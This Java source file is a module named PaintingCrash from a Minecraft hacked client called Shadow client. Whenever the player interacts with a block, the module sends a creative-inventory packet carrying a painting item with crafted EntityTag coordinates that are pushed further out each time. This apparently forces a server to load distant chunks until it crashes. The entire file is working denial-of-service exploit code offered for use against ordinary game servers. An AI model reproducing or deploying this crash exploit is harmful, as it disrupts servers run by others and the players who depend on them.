/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtInt;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.event.EventType;
import net.shadow.client.helper.event.Events;
import net.shadow.client.helper.event.events.PacketEvent;

public class PaintingCrash extends Module {
    private int xChunk;
    private int zChunk;


    public PaintingCrash() {
        super("PaintingCrash", "Painting crash real", ModuleType.CRASH);
        Events.registerEventHandler(EventType.PACKET_SEND, pevent -> {
            PacketEvent event = (PacketEvent) pevent;
            if (!this.isEnabled()) return;
            if (event.getPacket() instanceof PlayerInteractBlockC2SPacket packet) {
                ItemStack load = new ItemStack(Items.PAINTING, 1);
                NbtCompound comp = new NbtCompound();
                NbtCompound betag = new NbtCompound();
                betag.put("TileX", NbtInt.of(xChunk << 4));
                betag.put("TileZ", NbtInt.of(zChunk * 10 << 4));
                comp.put("EntityTag", betag);
                load.setNbt(comp);
                client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(client.player.getInventory().selectedSlot + 36, load));
                xChunk += 10;
                zChunk++;
            }
        });
    }

    @Override
    public void tick() {

    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
